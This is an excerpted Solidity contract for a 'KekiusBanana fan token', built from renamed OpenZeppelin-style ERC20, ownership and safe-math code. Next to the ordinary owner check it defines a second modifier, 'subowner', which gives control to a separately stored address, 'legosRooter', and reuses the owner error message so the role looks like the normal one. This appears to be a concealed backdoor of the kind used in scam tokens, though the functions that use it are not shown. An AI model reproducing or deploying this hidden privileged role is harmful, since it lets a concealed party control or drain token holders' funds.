...
/// https://x.com/KekiusBanana


pragma solidity 0.8.29;

// KekiusBanana fan token

interface KekiusBananainterface {
  /**
...
/*
 * @dev Provides information about the current execution KekiusBanana20Burnable, including the
 ...
 */
abstract contract KekiusBanana20Burnable {
...
// File: @openzeppelin/contracts/access/KekiusBanana20Ownable.sol
 ...
 * the owner.
 */
abstract contract KekiusBanana20Ownable is KekiusBanana20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "KekiusBanana20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "KekiusBanana20Ownable: new owner is the zero address");
 ...
 * `SafeKekiusBanana` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeKekiusBanana {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeKekiusBanana: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeKekiusBanana: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeKekiusBanana: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeKekiusBanana: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeKekiusBanana: modulo by zero");
  }
...
contract KekiusBananaToken is KekiusBanana20Burnable, KekiusBananainterface, KekiusBanana20Ownable {
    
    using SafeKekiusBanana for uint256;
    ...
    */
    ...
    /**
    * @dev See {KekiusBananainterface-totalSupply}.
    */
    ...
    /**
    * @dev See {KekiusBananainterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "KekiusBanana20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {KekiusBananainterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {KekiusBananainterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {KekiusBananainterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {KekiusBananainterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {KekiusBananainterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "KekiusBananainterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {KekiusBananainterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "KekiusBananainterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "KekiusBananainterface: transfer from the zero address");
        require(shippingto != address(0), "KekiusBananainterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "KekiusBananainterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "KekiusBananainterface: approve from the zero address");
        require(transporteur != address(0), "KekiusBananainterface: approve to the zero address");
